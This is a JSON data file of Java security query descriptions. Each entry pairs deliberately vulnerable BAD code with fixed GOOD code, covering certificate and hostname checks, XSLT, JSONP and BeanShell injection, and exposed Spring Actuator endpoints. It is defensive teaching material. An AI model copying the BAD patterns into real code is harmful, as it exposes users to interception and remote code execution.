    "help": "# JxBrowser with disabled certificate validation\nJxBrowser is a Java library that allows to embed the Chromium browser inside Java applications. Versions smaller than 6.24 by default ignore any HTTPS certificate errors thereby allowing man-in-the-middle attacks.\n\n\n## Recommendation\nDo either of these:\n\n* Update to version 6.24 or 7.x.x as these correctly reject certificate errors by default.\n* Add a custom implementation of the `LoadHandler` interface whose `onCertificateError` method always returns **true** indicating that loading should be cancelled. Then use the `setLoadHandler` method with your custom `LoadHandler` on every `Browser` you use.\n\n## Example\nThe following two examples show two ways of using a `Browser`. In the 'BAD' case, all certificate errors are ignored. In the 'GOOD' case, certificate errors are rejected.\n\n\n```java\npublic static void main(String[] args) {\n\t{\n\t\tBrowser browser = new Browser();\n\t\tbrowser.loadURL(\"https://example.com\");\n\t\t// no further calls\n\t\t// BAD: The browser ignores any certificate error by default!\n\t}\n\n\t{\n\t\tBrowser browser = new Browser();\n\t\tbrowser.setLoadHandler(new LoadHandler() {\n\t\t\tpublic boolean onLoad(LoadParams params) {\n\t\t\t\treturn true;\n\t\t\t}\n\n\t\t\tpublic boolean onCertificateError(CertificateErrorParams params){\n\t\t\t\treturn true; // GOOD: This means that loading will be cancelled on certificate errors\n\t\t\t}\n\t\t}); // GOOD: A secure `LoadHandler` is used.\n\t\tbrowser.loadURL(\"https://example.com\");\n\n\t}\n}\n```\n\n## References\n* Teamdev: [ Changelog of JxBrowser 6.24](https://jxbrowser-support.teamdev.com/release-notes/2019/v6-24.html).\n* Common Weakness Enumeration: [CWE-295](https://cwe.mitre.org/data/definitions/295.html).\n"
  },
  "java/extreme-value-arithmetic": {
    "name": "Use of extreme values in arithmetic expression",
    "description": "If a variable is assigned the maximum or minimum value for that variable's type and is then used in an arithmetic expression, this may result in an overflow.",
    "kind": "path-problem",
    "problem.severity": "recommendation",
    "security-severity": 8.6,
    "precision": "medium",
    "id": "java/extreme-value-arithmetic",
    "tags": [
      "security",
      "reliability",
      "external/cwe/cwe-190",
      "external/cwe/cwe-191"
    ],
    "filename": "47e93059-ArithmeticWithExtremeValues",
    "language": "java",
    "help": "# Use of extreme values in arithmetic expression\nAssigning the maximum or minimum value for a type to a variable of that type and then using the variable in calculations may cause overflows.\n\n\n## Recommendation\nBefore using the variable, ensure that it is reassigned a value that does not cause an overflow, or use a wider type to do the arithmetic.\n\n\n## Example\nIn this example, assigning `Long.MAX_VALUE` to a variable and adding one causes an overflow. However, casting to a `long` beforehand ensures that the arithmetic is done in the wider type, and so does not overflow.\n\n\n```java\nclass Test {\n\tpublic static void main(String[] args) {\t\n\t\t{\n\t\t\tlong i = Long.MAX_VALUE;\n\t\t\t// BAD: overflow\n\t\t\tlong j = i + 1;\n\t\t}\n\t\t\n\t\t{\n\t\t\tint i = Integer.MAX_VALUE;\n\t\t\t// GOOD: no overflow\n\t\t\tlong j = (long)i + 1;\n\t\t}\n\t}\n}\n```\n\n## References\n* SEI CERT Oracle Coding Standard for Java: [NUM00-J. Detect or prevent integer overflow](https://wiki.sei.cmu.edu/confluence/display/java/NUM00-J.+Detect+or+prevent+integer+overflow).\n* Common Weakness Enumeration: [CWE-190](https://cwe.mitre.org/data/definitions/190.html).\n* Common Weakness Enumeration: [CWE-191](https://cwe.mitre.org/data/definitions/191.html).\n"
  },
  "java/unsafe-hostname-verification": {
    "name": "Unsafe hostname verification",
    "description": "Marking a certificate as valid for a host without checking the certificate hostname allows an attacker to perform a machine-in-the-middle attack.",
    "kind": "path-problem",
    "problem.severity": "error",
    "security-severity": 5.9,
    "precision": "high",
    "id": "java/unsafe-hostname-verification",
    "tags": [
      "security",
      "external/cwe/cwe-297"
    ],
    "filename": "c3662c44-UnsafeHostnameVerification",
    "language": "java",
    "help": "# Unsafe hostname verification\nIf a `HostnameVerifier` always returns `true` it will not verify the hostname at all. This stops Transport Layer Security (TLS) providing any security and allows an attacker to perform a man-in-the-middle attack against the application.\n\nAn attack might look like this:\n\n1. The program connects to `https://example.com`.\n1. The attacker intercepts this connection and presents an apparently-valid certificate of their choosing.\n1. The `TrustManager` of the program verifies that the certificate has been issued by a trusted certificate authority.\n1. The Java HTTPS library checks whether the certificate has been issued for the host `example.com`. This check fails because the certificate has been issued for a domain controlled by the attacker, for example: `malicious.domain`.\n1. The HTTPS library wants to reject the certificate because the hostname does not match. Before doing this it checks whether a `HostnameVerifier` exists.\n1. Your `HostnameVerifier` is called which returns `true` for any certificate so also for this one.\n1. The program proceeds with the connection since your `HostnameVerifier` accepted it.\n1. The attacker can now read the data your program sends to `https://example.com` and/or alter its replies while the program thinks the connection is secure.\n\n## Recommendation\nDo not use an open `HostnameVerifier`. If you have a configuration problem with TLS/HTTPS, you should always solve the configuration problem instead of using an open verifier.\n\n\n## Example\nIn the first (bad) example, the `HostnameVerifier` always returns `true`. This allows an attacker to perform a man-in-the-middle attack, because any certificate is accepted despite an incorrect hostname. In the second (good) example, the `HostnameVerifier` only returns `true` when the certificate has been correctly checked.\n\n\n```java\npublic static void main(String[] args) {\n\n\t{\n\t\tHostnameVerifier verifier = new HostnameVerifier() {\n\t\t\t@Override\n\t\t\tpublic boolean verify(String hostname, SSLSession session) {\n\t\t\t\treturn true; // BAD: accept even if the hostname doesn't match\n\t\t\t}\n\t\t};\n\t\tHttpsURLConnection.setDefaultHostnameVerifier(verifier);\n\t}\n\n\t{\n\t\tHostnameVerifier verifier = new HostnameVerifier() {\n\t\t\t@Override\n\t\t\tpublic boolean verify(String hostname, SSLSession session) {\n\t\t\t\ttry { // GOOD: verify the certificate\n\t\t\t\t\tCertificate[] certs = session.getPeerCertificates();\n\t\t\t\t\tX509Certificate x509 = (X509Certificate) certs[0];\n\t\t\t\t\tcheck(new String[]{host}, x509);\n\t\t\t\t\treturn true;\n\t\t\t\t} catch (SSLException e) {\n\t\t\t\t\treturn false;\n\t\t\t\t}\n\t\t\t}\n\t\t};\n\t\tHttpsURLConnection.setDefaultHostnameVerifier(verifier);\n\t}\n\n}\n```\n\n## References\n* Android developers: [Security with HTTPS and SSL](https://developer.android.com/training/articles/security-ssl).\n* Terse systems blog: [Fixing Hostname Verification](https://tersesystems.com/blog/2014/03/23/fixing-hostname-verification/).\n* Common Weakness Enumeration: [CWE-297](https://cwe.mitre.org/data/definitions/297.html).\n"
  },
  "java/ignored-hostname-verification": {
    "name": "Ignored result of hostname verification",
    "description": "The method HostnameVerifier.verify() returns a result of hostname verification. A caller has to check the result and drop the connection if the verification failed.",
    "kind": "problem",
    "problem.severity": "error",
    "precision": "high",
    "id": "java/ignored-hostname-verification",
    "tags": [
      "security",
      "experimental",
      "external/cwe/cwe-297"
    ],
    "filename": "316490d0-IgnoredHostnameVerification",
    "language": "java",
    "help": "# Ignored result of hostname verification\nThe method `HostnameVerifier.verify()` checks that the hostname from the server's certificate matches the server hostname after an HTTPS connection is established. The method returns `true` if the hostname is acceptable and `false` otherwise. The contract of the method does not require it to throw an exception if the verification failed. Therefore, a caller has to check the result and drop the connection if the hostname verification failed. Otherwise, an attacker may be able to implement a man-in-the-middle attack and impersonate the server.\n\n\n## Recommendation\nAlways check the result of `HostnameVerifier.verify()` and drop the connection if the method returns false.\n\n\n## Example\nIn the following example, the method `HostnameVerifier.verify()` is called but its result is ignored. As a result, no hostname verification actually happens.\n\n\n```java\npublic SSLSocket connect(String host, int port, HostnameVerifier verifier) {\n    SSLSocket socket = (SSLSocket) SSLSocketFactory.getDefault().createSocket(host, port);\n    socket.startHandshake();\n    verifier.verify(host, socket.getSession());\n    return socket;\n}\n```\nIn the next example, the result of the `HostnameVerifier.verify()` method is checked and an exception is thrown if the verification failed.\n\n\n```java\npublic SSLSocket connect(String host, int port, HostnameVerifier verifier) {\n    SSLSocket socket = (SSLSocket) SSLSocketFactory.getDefault().createSocket(host, port);\n    socket.startHandshake();\n    boolean successful = verifier.verify(host, socket.getSession());\n    if (!successful) {\n        socket.close();\n        throw new SSLException(\"Oops! Hostname verification failed!\");\n    }\n    return socket;\n}\n```\n\n## References\n* Java API Specification: [HostnameVerifier.verify() method](https://docs.oracle.com/en/java/javase/11/docs/api/java.base/javax/net/ssl/HostnameVerifier.html#verify(java.lang.String,javax.net.ssl.SSLSession)).\n* Common Weakness Enumeration: [CWE-297](https://cwe.mitre.org/data/definitions/297.html).\n"
  },
  "java/non-https-url": {
    "name": "Failure to use HTTPS URLs",
    "description": "Non-HTTPS connections can be intercepted by third parties.",
    "kind": "path-problem",
    "problem.severity": "recommendation",
    "security-severity": 7.5,
    "precision": "medium",
    "id": "java/non-https-url",
    "tags": [
      "security",
      "external/cwe/cwe-319",
      "external/cwe/cwe-345"
    ],
    "filename": "8b24eede-HttpsUrls",
    "language": "java",
    "help": "# Failure to use HTTPS URLs\nConstructing URLs with the HTTP protocol can lead to unsecured connections.\n\nFurthermore, constructing URLs with the HTTP protocol can create problems if other parts of the code expect HTTPS URLs. A typical pattern is to cast the `URLConnection` that is produced by `url.getConnection()` to an `HttpsURLConnection`. This is impossible if the URL that has been constructed uses HTTP rather than HTTPS, and results in a run-time `ClassCastException`.\n\n\n## Recommendation\nWhen you construct a URL using `java.net.URL`, ensure that you use an HTTPS URL rather than an HTTP URL. Then, any connections that are made using that URL are secure SSL connections.\n\n\n## Example\nThe following example shows two ways of opening a connection using a URL. When the connection is opened using an HTTP URL rather than an HTTPS URL, the connection is unsecured, and in this case a `ClassCastException` is caused. When the connection is opened using an HTTPS URL, the connection is a secure SSL connection.\n\n\n```java\npublic static void main(String[] args) {\n\t{\n\t\ttry {\n\t\t\tString protocol = \"http://\";\n\t\t\tURL u = new URL(protocol + \"www.secret.example.org/\");\n\t\t\t// BAD: This causes a 'ClassCastException' at runtime, because the\n\t\t\t// HTTP URL cannot be used to make an 'HttpsURLConnection', \n\t\t\t// which enforces SSL.\n\t\t\tHttpsURLConnection hu = (HttpsURLConnection) u.openConnection();\n\t\t\thu.setRequestMethod(\"PUT\");\n\t\t\thu.connect();\n\t\t\tOutputStream os = hu.getOutputStream();\n\t\t\thu.disconnect();\n\t\t}\n\t\tcatch (IOException e) {\n\t\t\t// fail\n\t\t}\n\t}\n\t\n\t{\n\t\ttry {\n\t\t\tString protocol = \"https://\";\n\t\t\tURL u = new URL(protocol + \"www.secret.example.org/\");\n\t\t\t// GOOD: Opening a connection to a URL using HTTPS enforces SSL.\n\t\t\tHttpsURLConnection hu = (HttpsURLConnection) u.openConnection();\n\t\t\thu.setRequestMethod(\"PUT\");\n\t\t\thu.connect();\n\t\t\tOutputStream os = hu.getOutputStream();\n\t\t\thu.disconnect();\n\t\t}\n\t\tcatch (IOException e) {\n\t\t\t// fail\n\t\t}\n\t}\n}\n```\n\n## References\n* SEI CERT Oracle Coding Standard for Java: [SER03-J. Do not serialize unencrypted, sensitive data](https://wiki.sei.cmu.edu/confluence/display/java/SER03-J.+Do+not+serialize+unencrypted+sensitive+data).\n* Java API Specification: [ Class HttpsURLConnection](https://docs.oracle.com/en/java/javase/11/docs/api/java.base/javax/net/ssl/HttpsURLConnection.html).\n* OWASP: [Transport Layer Protection Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Transport_Layer_Protection_Cheat_Sheet.html).\n* Common Weakness Enumeration: [CWE-319](https://cwe.mitre.org/data/definitions/319.html).\n* Common Weakness Enumeration: [CWE-345](https://cwe.mitre.org/data/definitions/345.html).\n"
  },
  "java/xslt-injection": {
    "name": "XSLT transformation with user-controlled stylesheet",
    "description": "Performing an XSLT transformation with user-controlled stylesheets can lead to information disclosure or execution of arbitrary code.",
    "kind": "path-problem",
    "problem.severity": "error",
    "security-severity": 9.8,
    "precision": "high",
    "id": "java/xslt-injection",
    "tags": [
      "security",
      "external/cwe/cwe-074"
    ],
    "filename": "b150939b-XsltInjection",
    "language": "java",
    "help": "# XSLT transformation with user-controlled stylesheet\nXSLT (Extensible Stylesheet Language Transformations) is a language for transforming XML documents into other XML documents or other formats. Processing unvalidated XSLT stylesheets can allow attackers to read arbitrary files from the filesystem or to execute arbitrary code.\n\n\n## Recommendation\nThe general recommendation is to not process untrusted XSLT stylesheets. If user-provided stylesheets must be processed, enable the secure processing mode.\n\n\n## Example\nIn the following examples, the code accepts an XSLT stylesheet from the user and processes it.\n\nIn the first example, the user-provided XSLT stylesheet is parsed and processed.\n\nIn the second example, secure processing mode is enabled.\n\n\n```java\nimport javax.xml.XMLConstants;\nimport javax.xml.transform.TransformerFactory;\nimport javax.xml.transform.stream.StreamResult;\nimport javax.xml.transform.stream.StreamSource;\n\npublic void transform(Socket socket, String inputXml) throws Exception {\n  StreamSource xslt = new StreamSource(socket.getInputStream());\n  StreamSource xml = new StreamSource(new StringReader(inputXml));\n  StringWriter result = new StringWriter();\n  TransformerFactory factory = TransformerFactory.newInstance();\n\n  // BAD: User provided XSLT stylesheet is processed\n  factory.newTransformer(xslt).transform(xml, new StreamResult(result));\n\n  // GOOD: The secure processing mode is enabled\n  factory.setFeature(XMLConstants.FEATURE_SECURE_PROCESSING, true);\n  factory.newTransformer(xslt).transform(xml, new StreamResult(result));\n}  \n```\n\n## References\n* Wikipedia: [XSLT](https://en.wikipedia.org/wiki/XSLT).\n* The Java Tutorials: [Transforming XML Data with XSLT](https://docs.oracle.com/javase/tutorial/jaxp/xslt/transformingXML.html).\n* [XSLT Injection Basics](https://blog.hunniccyber.com/ektron-cms-remote-code-execution-xslt-transform-injection-java/).\n* Common Weakness Enumeration: [CWE-74](https://cwe.mitre.org/data/definitions/74.html).\n"
  },
  "java/android/sensitive-result-receiver": {
    "name": "Leaking sensitive information through a ResultReceiver",
    "description": "Sending sensitive data to a 'ResultReceiver' obtained from an untrusted source can allow malicious actors access to your information.",
    "kind": "path-problem",
    "problem.severity": "error",
    "security-severity": 8.2,
    "precision": "medium",
    "id": "java/android/sensitive-result-receiver",
    "tags": [
      "security",
      "external/cwe/cwe-927"
    ],
    "filename": "fb706418-SensitiveResultReceiver",
    "language": "java",
    "help": "# Leaking sensitive information through a ResultReceiver\nIf a `ResultReceiver` is obtained from an untrusted source, such as an `Intent` received by an exported component, do not send it sensitive data. Otherwise, the information may be leaked to a malicious application.\n\n\n## Recommendation\nDo not send sensitive data to an untrusted `ResultReceiver`.\n\n\n## Example\nIn the following (bad) example, sensitive data is sent to an untrusted `ResultReceiver`.\n\n\n```java\n// BAD: Sensitive data is sent to an untrusted result receiver \nvoid bad(String password) {\n    Intent intent = getIntent();\n    ResultReceiver rec = intent.getParcelableExtra(\"Receiver\");\n    Bundle b = new Bundle();\n    b.putCharSequence(\"pass\", password);\n    rec.send(0, b); \n}\n```\n\n## References\n* Common Weakness Enumeration: [CWE-927](https://cwe.mitre.org/data/definitions/927.html).\n"
  },
  "java/jsonp-injection": {
    "name": "JSONP Injection",
    "description": "User-controlled callback function names that are not verified are vulnerable to jsonp injection attacks.",
    "kind": "path-problem",
    "problem.severity": "error",
    "precision": "high",
    "id": "java/jsonp-injection",
    "tags": [
      "security",
      "experimental",
      "external/cwe/cwe-352"
    ],
    "filename": "1d86fbdb-JsonpInjection",
    "language": "java",
    "help": "# JSONP Injection\nThe software uses external input as the function name to wrap JSON data and returns it to the client as a request response. When there is a cross-domain problem, this could lead to information leakage.\n\n\n## Recommendation\nAdding `Referer`/`Origin` or random `token` verification processing can effectively prevent the leakage of sensitive information.\n\n\n## Example\nThe following examples show the bad case and the good case respectively. Bad cases, such as `bad1` to `bad7`, will cause information leakage when there are cross-domain problems. In a good case, for example, in the `good1` method and the `good2` method, When these two methods process the request, there must be a request body in the request, which does not meet the conditions of Jsonp injection.\n\n\n```java\nimport com.alibaba.fastjson.JSONObject;\nimport com.fasterxml.jackson.databind.ObjectMapper;\nimport com.google.gson.Gson;\nimport java.io.BufferedReader;\nimport java.io.IOException;\nimport java.io.InputStreamReader;\nimport java.io.PrintWriter;\nimport java.util.HashMap;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\nimport org.springframework.stereotype.Controller;\nimport org.springframework.web.bind.annotation.GetMapping;\nimport org.springframework.web.bind.annotation.RequestMapping;\nimport org.springframework.web.bind.annotation.RequestMethod;\nimport org.springframework.web.bind.annotation.RequestParam;\nimport org.springframework.web.bind.annotation.ResponseBody;\nimport org.springframework.web.multipart.MultipartFile;\n\n@Controller\npublic class JsonpInjection {\n\n    private static HashMap hashMap = new HashMap();\n\n    static {\n        hashMap.put(\"username\",\"admin\");\n        hashMap.put(\"password\",\"123456\");\n    }\n\n    @GetMapping(value = \"jsonp1\")\n    @ResponseBody\n    public String bad1(HttpServletRequest request) {\n        String resultStr = null;\n        String jsonpCallback = request.getParameter(\"jsonpCallback\");\n        Gson gson = new Gson();\n        String result = gson.toJson(hashMap);\n        resultStr = jsonpCallback + \"(\" + result + \")\";\n        return resultStr;\n    }\n\n    @GetMapping(value = \"jsonp2\")\n    @ResponseBody\n    public String bad2(HttpServletRequest request) {\n        String resultStr = null;\n        String jsonpCallback = request.getParameter(\"jsonpCallback\");\n        resultStr = jsonpCallback + \"(\" + JSONObject.toJSONString(hashMap) + \")\";\n        return resultStr;\n    }\n\n    @GetMapping(value = \"jsonp3\")\n    @ResponseBody\n    public String bad3(HttpServletRequest request) {\n        String resultStr = null;\n        String jsonpCallback = request.getParameter(\"jsonpCallback\");\n        String jsonStr = getJsonStr(hashMap);\n        resultStr = jsonpCallback + \"(\" + jsonStr + \")\";\n        return resultStr;\n    }\n\n    @GetMapping(value = \"jsonp4\")\n    @ResponseBody\n    public String bad4(HttpServletRequest request) {\n        String resultStr = null;\n        String jsonpCallback = request.getParameter(\"jsonpCallback\");\n        String restr = JSONObject.toJSONString(hashMap);\n        resultStr = jsonpCallback + \"(\" + restr + \");\";\n        return resultStr;\n    }\n\n    @GetMapping(value = \"jsonp5\")\n    @ResponseBody\n    public void bad5(HttpServletRequest request,\n            HttpServletResponse response) throws Exception {\n        String jsonpCallback = request.getParameter(\"jsonpCallback\");\n        PrintWriter pw = null;\n        Gson gson = new Gson();\n        String result = gson.toJson(hashMap);\n        String resultStr = null;\n        pw = response.getWriter();\n        resultStr = jsonpCallback + \"(\" + result + \")\";\n        pw.println(resultStr);\n    }\n\n    @GetMapping(value = \"jsonp6\")\n    @ResponseBody\n    public void bad6(HttpServletRequest request,\n            HttpServletResponse response) throws Exception {\n        String jsonpCallback = request.getParameter(\"jsonpCallback\");\n        PrintWriter pw = null;\n        ObjectMapper mapper = new ObjectMapper();\n        String result = mapper.writeValueAsString(hashMap);\n        String resultStr = null;\n        pw = response.getWriter();\n        resultStr = jsonpCallback + \"(\" + result + \")\";\n        pw.println(resultStr);\n    }\n\n    @RequestMapping(value = \"jsonp7\", method = RequestMethod.GET)\n    @ResponseBody\n    public String bad7(HttpServletRequest request) {\n        String resultStr = null;\n        String jsonpCallback = request.getParameter(\"jsonpCallback\");\n        Gson gson = new Gson();\n        String result = gson.toJson(hashMap);\n        resultStr = jsonpCallback + \"(\" + result + \")\";\n        return resultStr;\n    }\n\n    @RequestMapping(value = \"jsonp11\")\n    @ResponseBody\n    public String good1(HttpServletRequest request) {\n        JSONObject parameterObj = readToJSONObect(request);\n        String resultStr = null;\n        String jsonpCallback = request.getParameter(\"jsonpCallback\");\n        String restr = JSONObject.toJSONString(hashMap);\n        resultStr = jsonpCallback + \"(\" + restr + \");\";\n        return resultStr;\n    }\n\n    @RequestMapping(value = \"jsonp12\")\n    @ResponseBody\n    public String good2(@RequestParam(\"file\") MultipartFile file,HttpServletRequest request) {\n        if(null == file){\n            return \"upload file error\";\n        }\n        String fileName = file.getOriginalFilename();\n        System.out.println(\"file operations\");\n        String resultStr = null;\n        String jsonpCallback = request.getParameter(\"jsonpCallback\");\n        String restr = JSONObject.toJSONString(hashMap);\n        resultStr = jsonpCallback + \"(\" + restr + \");\";\n        return resultStr;\n    }\n\n    public static JSONObject readToJSONObect(HttpServletRequest request){\n        String jsonText = readPostContent(request);\n        JSONObject jsonObj = JSONObject.parseObject(jsonText, JSONObject.class);\n        return jsonObj;\n    }\n\n    public static String readPostContent(HttpServletRequest request){\n        BufferedReader in= null;\n        String content = null;\n        String line = null;\n        try {\n            in = new BufferedReader(new InputStreamReader(request.getInputStream(),\"UTF-8\"));\n            StringBuilder buf = new StringBuilder();\n            while ((line = in.readLine()) != null) {\n                buf.append(line);\n            }\n            content = buf.toString();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n        String uri = request.getRequestURI();\n        return content;\n    }\n\n    public static String getJsonStr(Object result) {\n        return JSONObject.toJSONString(result);\n    }\n}\n```\n\n## References\n* OWASPLondon20161124_JSON_Hijacking_Gareth_Heyes: [JSON hijacking](https://owasp.org/www-chapter-london/assets/slides/OWASPLondon20161124_JSON_Hijacking_Gareth_Heyes.pdf).\n* Practical JSONP Injection: [ Completely controllable from the URL (GET variable) ](https://securitycafe.ro/2017/01/18/practical-jsonp-injection).\n* Common Weakness Enumeration: [CWE-352](https://cwe.mitre.org/data/definitions/352.html).\n"
  },
  "java/insecure-spring-actuator-config": {
    "name": "Insecure Spring Boot Actuator Configuration",
    "description": "Exposed Spring Boot Actuator through configuration files without declarative or procedural security enforcement leads to information leak or even remote code execution.",
    "kind": "problem",
    "problem.severity": "error",
    "precision": "high",
    "id": "java/insecure-spring-actuator-config",
    "tags": [
      "security",
      "experimental",
      "external/cwe/cwe-016"
    ],
    "filename": "c663f2ea-InsecureSpringActuatorConfig",
    "language": "java",
    "help": "# Insecure Spring Boot Actuator Configuration\nSpring Boot is a popular framework that facilitates the development of stand-alone applications and micro services. Spring Boot Actuator helps to expose production-ready support features against Spring Boot applications.\n\nEndpoints of Spring Boot Actuator allow to monitor and interact with a Spring Boot application. Exposing unprotected actuator endpoints through configuration files can lead to information disclosure or even remote code execution vulnerability.\n\nRather than programmatically permitting endpoint requests or enforcing access control, frequently developers simply leave management endpoints publicly accessible in the application configuration file `application.properties` without enforcing access control through Spring Security.\n\n\n## Recommendation\nDeclare the Spring Boot Starter Security module in XML configuration or programmatically enforce security checks on management endpoints using Spring Security. Otherwise accessing management endpoints on a different HTTP port other than the port that the web application is listening on also helps to improve the security.\n\n\n## Example\nThe following examples show both 'BAD' and 'GOOD' configurations. In the 'BAD' configuration, no security module is declared and sensitive management endpoints are exposed. In the 'GOOD' configuration, security is enforced and only endpoints requiring exposure are exposed.\n\n\n```xml\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<project xmlns=\"http://maven.apache.org/POM/4.0.0\"\n         xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n         xsi:schemaLocation=\"http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd\">\n    <modelVersion>4.0.0</modelVersion>\n\n    <groupId>spring-boot-actuator-app</groupId>\n    <artifactId>spring-boot-actuator-app</artifactId>\n    <version>1.0-SNAPSHOT</version>\n\n    <properties>\n        <project.build.sourceEncoding>UTF-8</project.build.sourceEncoding>\n        <maven.compiler.source>1.8</maven.compiler.source>\n        <maven.compiler.target>1.8</maven.compiler.target>\n    </properties>\n\n    <parent>\n        <groupId>org.springframework.boot</groupId>\n        <artifactId>spring-boot-starter-parent</artifactId>\n        <version>2.3.8.RELEASE</version>\n        <relativePath/>\n    </parent>\n\n    <dependencies>\n        <dependency>\n            <groupId>org.springframework.boot</groupId>\n            <artifactId>spring-boot-starter-web</artifactId>\n        </dependency>\n        <dependency>\n            <groupId>org.springframework.boot</groupId>\n            <artifactId>spring-boot-starter-actuator</artifactId>\n        </dependency>\n        <dependency>\n            <groupId>org.springframework.boot</groupId>\n            <artifactId>spring-boot-devtools</artifactId>\n        </dependency>\n\n        <!-- GOOD: Enable Spring Security -->\n        <dependency>\n            <groupId>org.springframework.boot</groupId>\n            <artifactId>spring-boot-starter-security</artifactId>\n        </dependency>\n\n        <dependency>\n            <groupId>org.springframework.boot</groupId>\n            <artifactId>spring-boot-test</artifactId>\n        </dependency>\n    </dependencies>\n\n</project>\n```\n\n```xml\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<project xmlns=\"http://maven.apache.org/POM/4.0.0\"\n         xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n         xsi:schemaLocation=\"http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd\">\n    <modelVersion>4.0.0</modelVersion>\n\n    <groupId>spring-boot-actuator-app</groupId>\n    <artifactId>spring-boot-actuator-app</artifactId>\n    <version>1.0-SNAPSHOT</version>\n\n    <properties>\n        <project.build.sourceEncoding>UTF-8</project.build.sourceEncoding>\n        <maven.compiler.source>1.8</maven.compiler.source>\n        <maven.compiler.target>1.8</maven.compiler.target>\n    </properties>\n\n    <parent>\n        <groupId>org.springframework.boot</groupId>\n        <artifactId>spring-boot-starter-parent</artifactId>\n        <version>2.3.8.RELEASE</version>\n        <relativePath/>\n    </parent>\n\n    <dependencies>\n        <dependency>\n            <groupId>org.springframework.boot</groupId>\n            <artifactId>spring-boot-starter-web</artifactId>\n        </dependency>\n        <dependency>\n            <groupId>org.springframework.boot</groupId>\n            <artifactId>spring-boot-starter-actuator</artifactId>\n        </dependency>\n        <dependency>\n            <groupId>org.springframework.boot</groupId>\n            <artifactId>spring-boot-devtools</artifactId>\n        </dependency>\n\n        <!-- BAD: No Spring Security enabled -->\n        <!-- dependency>\n            <groupId>org.springframework.boot</groupId>\n            <artifactId>spring-boot-starter-security</artifactId>\n        </dependency -->\n\n        <dependency>\n            <groupId>org.springframework.boot</groupId>\n            <artifactId>spring-boot-test</artifactId>\n        </dependency>\n    </dependencies>\n\n</project>\n```\n\n```none\n#management.endpoints.web.base-path=/admin\n\n\n#### BAD: All management endpoints are accessible #### \n# vulnerable configuration (spring boot 1.0 - 1.4): exposes actuators by default\n\n# vulnerable configuration (spring boot 1.5+): requires value false to expose sensitive actuators\nmanagement.security.enabled=false\n\n# vulnerable configuration (spring boot 2+): exposes health and info only by default, here overridden to expose everything\nmanagement.endpoints.web.exposure.include=*\n\n\n#### GOOD: All management endpoints have access control #### \n# safe configuration (spring boot 1.0 - 1.4): exposes actuators by default\nmanagement.security.enabled=true\n\n# safe configuration (spring boot 1.5+): requires value false to expose sensitive actuators\nmanagement.security.enabled=true\n\n# safe configuration (spring boot 2+): exposes health and info only by default, here overridden to expose one additional endpoint which we assume is intentional and safe.\nmanagement.endpoints.web.exposure.include=beans,info,health\n\n```\n\n## References\n* Spring Boot documentation: [Spring Boot Actuator: Production-ready Features](https://docs.spring.io/spring-boot/docs/current/reference/html/production-ready-features.html)\n* VERACODE Blog: [Exploiting Spring Boot Actuators](https://www.veracode.com/blog/research/exploiting-spring-boot-actuators)\n* HackerOne Report: [Spring Actuator endpoints publicly available, leading to account takeover](https://hackerone.com/reports/862589)\n* Common Weakness Enumeration: [CWE-16](https://cwe.mitre.org/data/definitions/16.html).\n"
  },
  "java/beanshell-injection": {
    "name": "BeanShell injection",
    "description": "Evaluation of a user-controlled BeanShell expression may lead to arbitrary code execution.",
    "kind": "path-problem",
    "problem.severity": "error",
    "precision": "high",
    "id": "java/beanshell-injection",
    "tags": [
      "security",
      "experimental",
      "external/cwe/cwe-094"
    ],
    "filename": "dad3fd69-BeanShellInjection",
    "language": "java",
    "help": "# BeanShell injection\nBeanShell is a small, free, embeddable Java source interpreter with object scripting language features, written in Java. BeanShell dynamically executes standard Java syntax and extends it with common scripting conveniences such as loose types, commands, and method closures like those in Perl and JavaScript. If a BeanShell expression is built using attacker-controlled data, and then evaluated, then it may allow the attacker to run arbitrary code.\n\n\n## Recommendation\nIt is generally recommended to avoid using untrusted input in a BeanShell expression. If it is not possible, BeanShell expressions should be run in a sandbox that allows accessing only explicitly allowed classes.\n\n\n## Example\nThe following example uses untrusted data to build and run a BeanShell expression.\n\n\n```java\nimport bsh.Interpreter;\nimport javax.servlet.http.HttpServletRequest;\nimport org.springframework.scripting.bsh.BshScriptEvaluator;\nimport org.springframework.scripting.support.StaticScriptSource;\nimport org.springframework.stereotype.Controller;\nimport org.springframework.web.bind.annotation.GetMapping;\n\n@Controller\npublic class BeanShellInjection {\n\n\t@GetMapping(value = \"bad1\")\n\tpublic void bad1(HttpServletRequest request) {\n\t\tString code = request.getParameter(\"code\");\n\t\tBshScriptEvaluator evaluator = new BshScriptEvaluator();\n\t\tevaluator.evaluate(new StaticScriptSource(code)); //bad\n\t}\n\n\t@GetMapping(value = \"bad2\")\n\tpublic void bad2(HttpServletRequest request) throws Exception {\n\t\tString code = request.getParameter(\"code\");\n\t\tInterpreter interpreter = new Interpreter();\n\t\tinterpreter.eval(code);  //bad\n\t}\n\n\t@GetMapping(value = \"bad3\")\n\tpublic void bad3(HttpServletRequest request) {\n\t\tString code = request.getParameter(\"code\");\n\t\tStaticScriptSource staticScriptSource = new StaticScriptSource(\"test\");\n\t\tstaticScriptSource.setScript(code);\n\t\tBshScriptEvaluator evaluator = new BshScriptEvaluator();\n\t\tevaluator.evaluate(staticScriptSource);  //bad\n\t}\n}\n\n```\n\n## References\n* CVE-2016-2510:[BeanShell Injection](https://nvd.nist.gov/vuln/detail/CVE-2016-2510).\n* Common Weakness Enumeration: [CWE-94](https://cwe.mitre.org/data/definitions/94.html).\n"
  },
  "java/insecure-smtp-ssl": {
    "name": "Insecure JavaMail SSL Configuration",
    "description": "Configuring a Java application to use authenticated mail session over SSL without certificate validation makes the session susceptible to a man-in-the-middle attack.",
    "kind": "problem",
    "problem.severity": "warning",
    "security-severity": 5.9,
    "precision": "medium",
    "id": "java/insecure-smtp-ssl",
    "tags": [
      "security",
      "external/cwe/cwe-297"
    ],
    "filename": "c3662c44-InsecureJavaMail",
    "language": "java",
